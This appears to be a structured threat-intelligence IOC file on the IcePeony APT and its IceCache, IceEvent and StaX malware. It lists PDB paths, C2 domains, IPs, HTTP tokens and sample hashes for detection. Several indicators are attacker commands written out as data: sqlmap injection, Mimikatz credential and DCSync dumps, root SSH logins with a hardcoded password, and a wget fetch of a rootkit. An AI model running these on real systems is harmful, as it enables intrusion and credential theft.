@@ -1,0 +1,948 @@
+{
+  "malware_family": "IcePeony (IceCache, IceEvent, StaX)",
+  "threat_actor": "IcePeony",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "IcePeony is a China-nexus APT active since at least 2023 that gains access via SQL injection against public web servers, then deploys webshells and two custom malware families: the IIS module IceCache (Go, derived from reGeorge/reGeorgGo) and the passive service backdoor IceEvent, which share XOR-encoded C2 protocol and PDB paths under user 'power'. The actor uses open-source tooling (sqlmap, ProxyChains, Mimikatz, Diamorphine, craXcel, WmiExec, suo5) and a customized Stowaway variant called StaX. Detection can key on PDB paths, HTTP X-Cmd/X-Token headers and the 16-byte XOR key shared by both malware families.",
+  "mitre_techniques": [
+    "T1190",
+    "T1505.003",
+    "T1053.005",
+    "T1003.001",
+    "T1003.006",
+    "T1014",
+    "T1090",
+    "T1071.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\power\\documents\\visual studio 2017\\Projects\\cachsess\\x64\\Release\\cachsess.pdb",
+      "context": "IceCache 64-bit module PDB path",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\power\\Documents\\Visual Studio 2017\\Projects\\cachsess\\Release\\cachsess32.pdb",
+      "context": "IceCache 32-bit module PDB path",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\power\\Documents\\Visual Studio 2017\\Projects\\WinService\\x64\\Release\\WinService.pdb",
+      "context": "IceEvent service backdoor PDB path",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "reGeorgGo",
+      "context": "String inside IceCache referencing the project it is based on",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "reGeorgGo",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "key[4] = {0x32633425, 0x3C7BCAA1, 0x56F2E8D, 0x56372809}",
+      "context": "XOR keystream key shared by IceCache and IceEvent C2 encoding",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_achieveUUID",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_ModeMonitor",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_NormalActive",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_NormalPassive",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_NormalPassive_func1",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_init_0_func1",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_init_0",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_ParseOptions",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_agent_initial_checkOptions",
+      "context": "StaX development/function string",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_crypto_KeyPadding",
+      "context": "StaX function deriving AES key padding at runtime",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "StaX_crypto_AESDecrypt",
+      "context": "StaX AES decryption function",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "sOIEU1DF9pDpLeXjPtDRbLnnGRJPuTP9tsNwmSYauDzhPF-g1kYE1ceYCK8",
+      "context": "StaX active-mode communication target encryption key passed with -c",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./sta -c sOIEU1DF9pDpLeXjPtDRbLnnGRJPuTP9tsNwmSYauDzhPF-g1kYE1ceYCK8",
+      "context": "Attacker launching StaX server component (zsh history)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./agent -c sOIEU1DF9pDpLeXjPtDRbLnnGRJPuTP9tsNwmSYauDzhPF-g1kYE1ceYCK8",
+      "context": "Attacker launching StaX agent component (zsh history)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "python sqlmap.py -r 1.txt -p txtOfficerName --dbs",
+      "context": "SQL injection against government site, parent shell zsh",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "sqlmap",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "python sqlmap.py -r 1.txt -p txtOfficerName --dbs --random-agent",
+      "context": "Repeated SQL injection with random user agent",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "sqlmap",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "nmap -sV -p1-65535 -T4 -vv",
+      "context": "Full-port service scan of target",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "nmap",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "suo5-linux-amd64",
+      "context": "Open-source tunnel tool downloaded and run on victim",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./suo5-linux-amd64 -t https://<redacted> -l 0.0.0.0:8080",
+      "context": "suo5 tunnel started listening on 0.0.0.0:8080",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "mimikatz.exe \"log logon.txt\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "context": "hPass alias helper for credential dumping",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Mimikatz",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "mimikatz.exe \"lsadump::dcsync /domain:test.com /all /csv\" exit",
+      "context": "hPass alias helper for local LDAP/DC hash dump",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Mimikatz",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "proxyChains sshpass -p 'Admin@123' scp -o StrictHostKeyChecking=no /root/web/info.sh root@$ip:/tmp/",
+      "context": "Script deployment to victim via ProxyChains",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "proxyChains sshpass -p 'Admin@123' ssh -o StrictHostKeyChecking=no root@$ip",
+      "context": "Interactive SSH access to victim root account",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Admin@123",
+      "context": "Hardcoded password used for victim root SSH access",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/root/web/info.sh",
+      "context": "System information collection script pushed to victim",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/root/linux_back.sh",
+      "context": "Backdoor/persistence script creating backdoor users",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/root/linux_seo.sh",
+      "context": "Script pushed to victim alongside the others",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Diamorphine.tgz",
+      "context": "Rootkit downloaded via wget http://$WEBHOST/Diamorphine.tgz",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "Diamorphine",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "Diamorphine",
+      "context": "Linux rootkit installed by attacker",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "Diamorphine",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "craxel",
+      "context": "Open-source Office password unlocker used on victim files",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "craXcel",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "WmiExec",
+      "context": "Lateral movement tool used against other hosts",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "URLFinder",
+      "context": "Tool used for further host compromise",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "iisClient",
+      "context": "IceCache client wrapper, listed in Chinese-commented bash loop",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "./iisClient -u https://$line/1.txt --list",
+      "context": "Loop reading 1.txt to list IceCache proxy rules on many hosts",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Upload a local file 'to' remote server",
+      "context": "IceCache client usage string (--up)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CreateProcess failed: %d",
+      "context": "Error string in IceCache/IceEvent command execution routine",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Time out",
+      "context": "Error string in IceCache/IceEvent command execution routine",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "EXEC",
+      "context": "IceCache/IceEvent command token for process execution",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "EXEC_PRO",
+      "context": "IceCache TYPE-B command token for process execution",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SOCKS_HELLO",
+      "context": "IceCache SOCKS handshake command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SOCKS_CONNECT",
+      "context": "IceCache SOCKS connect command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SOCKS_DISCONNECT",
+      "context": "IceCache SOCKS disconnect command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SOCKS_READ",
+      "context": "IceCache SOCKS read command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SOCKS_FORWARD",
+      "context": "IceCache SOCKS data transfer command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_ADD",
+      "context": "IceCache add proxy rule command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_SET_JS",
+      "context": "IceCache set JavaScript command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_GET_JS",
+      "context": "IceCache get JavaScript command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_ALLOW_PC",
+      "context": "IceCache allowed PC settings command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_CACHE_CLEAR",
+      "context": "IceCache clear proxy cache command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PROXY_CACHE_TIME",
+      "context": "IceCache set proxy cache time command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "FILE_UPLOAD",
+      "context": "IceCache file upload command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "FILE_DOWNLOAD",
+      "context": "IceCache file download command",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "IIS_VERSION",
+      "context": "IceCache TYPE-B command to show IIS version",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "UPFILE",
+      "context": "IceEvent TYPE-B upload command",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DOWNFILE",
+      "context": "IceEvent TYPE-B download command",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "FILE:",
+      "context": "IceEvent TYPE-A command to read files via sockets",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "0gqOCbNX2DLfLV4n7GIq/STkDyn",
+      "context": "Go build ID of the IceCache sample",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": ".CobaltStrike4.8",
+      "context": "Directory in attacker's exposed open directory (OPSEC failure host)",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "165.22.211.62",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "64.227.133.248",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "173.208.156.19",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "173.208.156.144",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "154.213.17.225",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.150.186.219",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "63.141.255.16",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "204.12.205.10",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "107.148.37.63",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.99.60.119",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "154.213.17.237",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.195.205.88",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "154.213.17.244",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.99.60.93",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "149.115.231.17",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "149.115.231.39",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.99.60.108",
+      "context": "IcePeony infrastructure IP from IOC list",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "d45qomwkl.online",
+      "context": "IcePeony C2 domain from IOC list",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "k9ccin.com",
+      "context": "IcePeony C2 domain from IOC list",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "k8ccyn.com",
+      "context": "IcePeony C2 domain from IOC list",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "88k8cc.com",
+      "context": "IcePeony C2 domain from IOC list",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "googlesvn.com",
+      "context": "IcePeony C2 domain masquerading as Google service",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Cmd: EXEC",
+      "context": "IceCache/IceEvent C2 command header",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Token: cbFOvVX1582Mr7nt",
+      "context": "IceCache TYPE-A authentication token",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-Token: tn7rM2851XVvOFbc",
+      "context": "IceCache TYPE-B authentication token",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)",
+      "context": "User-Agent in decoded IceCache C2 request",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/",
+      "context": "IceCache C2 POST request path observed in decrypted traffic",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "5b16d1533754c9e625340c4fc2c1f76b11f37eb801166ccfb96d2aa02875a811",
+      "description": "IceCache IIS module, TYPE-B, 20 commands, compiled 2024-07-17"
+    },
+    {
+      "sha256": "484e274077ab6f9354bf71164a8edee4dc4672fcfbf05355958785824fe0468f",
+      "description": "IceCache IIS module, TYPE-B, 20 commands, compiled 2024-06-21"
+    },
+    {
+      "sha256": "11e90e2458a97957064a3d3f508fa6dadae19f632b45ff9523b7def50ebacb63",
+      "description": "IceCache IIS module, TYPE-B, 20 commands, compiled 2024-06-05"
+    },
+    {
+      "sha256": "b8d030ed55bfb6bc4fdc9fe34349ef502561519a79166344194052f165d69681",
+      "description": "IceCache IIS module, TYPE-B, 20 commands, compiled 2024-06-05"
+    },
+    {
+      "sha256": "ceb47274f4b6293df8904c917f423c2f07f1f31416b79f3b42b6d64e65dcfe1b",
+      "description": "IceCache IIS module, TYPE-B, 20 commands, compiled 2024-04-25"
+    },
+    {
+      "sha256": "d1955169cd8195ecedfb85a3234e4e6b191f596e493904ebca5f44e176f3f950",
+      "description": "IceCache IIS module, TYPE-B, 18 commands, compiled 2024-04-21"
+    },
+    {
+      "sha256": "de8f58f008ddaa60b5cf1b729ca03f276d2267e0a80b584f2f0723e0fac9f76c",
+      "description": "IceCache IIS module, TYPE-B, 18 commands, compiled 2024-04-21"
+    },
+    {
+      "sha256": "535586af127e85c5561199a9a1a3254d554a6cb97200ee139c5ce23e68a932bd",
+      "description": "IceCache IIS module, TYPE-B, 18 commands, compiled 2024-03-27"
+    },
+    {
+      "sha256": "0b8b10a2ff68cb2aa3451eedac4a8af4bd147ef9ddc6eb84fc5b01a65fca68fd",
+      "description": "IceCache IIS module, TYPE-B, 18 commands, compiled 2024-03-27"
+    },
+    {
+      "sha256": "a66627cc13f827064b7fcea643ab31b34a7cea444d85acc4e146d9f2b2851cf6",
+      "description": "IceCache IIS module, TYPE-A, 16 commands, compiled 2024-02-20"
+    },
+    {
+      "sha256": "e5f520d95cbad6ac38eb6badbe0ad225f133e0e410af4e6df5a36b06813e451b",
+      "description": "IceCache IIS module, TYPE-A, 24 commands, compiled 2024-02-01"
+    },
+    {
+      "sha256": "3eb56218a80582a79f8f4959b8360ada1b5e471d723812423e9d68354b6e008c",
+      "description": "IceCache IIS module, TYPE-A, 24 commands, compiled 2023-12-07"
+    },
+    {
+      "sha256": "5fd5e99fc503831b71f4072a335f662d1188d7bc8ca2340706344fb974c7fe46",
+      "description": "IceCache IIS module, TYPE-A, 24 commands, compiled 2023-09-27"
+    },
+    {
+      "sha256": "0eb60e4c5dc7b06b719e9dbd880eb5b7514272dc0d11e4760354f8bb44841f77",
+      "description": "IceCache IIS module, TYPE-A, 18 commands, first known sample, compiled 2023-08-23"
+    },
+    {
+      "sha256": "80e831180237b819e14c36e4af70304bc66744d26726310e3c0dd95f1740ee58",
+      "description": "IceEvent passive service backdoor, TYPE-B, 3 commands, compiled 2024-04-25"
+    },
+    {
+      "sha256": "9a0b0439e6fd2403f764acf0527f2365a4b9a98e9643cd5d03ccccf3825a732e",
+      "description": "IceEvent passive service backdoor, TYPE-B, 3 commands, compiled 2024-04-30"
+    },
+    {
+      "sha256": "9aba997bbf2f38f68ad8cc3474ef68eedd0b99e8f7ce39045f1d770e2af24fea",
+      "description": "IceEvent passive service backdoor, TYPE-B, 3 commands, compiled 2024-04-30"
+    },
+    {
+      "sha256": "bc94da1a066cbb9bdee7a03145609d0f9202b426a52aca19cc8d145b4175603b",
+      "description": "IceEvent passive service backdoor, TYPE-A, 2 commands, compiled 2023-08-23"
+    }
+  ],
+  "file_types": [
+    "elf",
+    "pe",
+    "script"
+  ]
+}
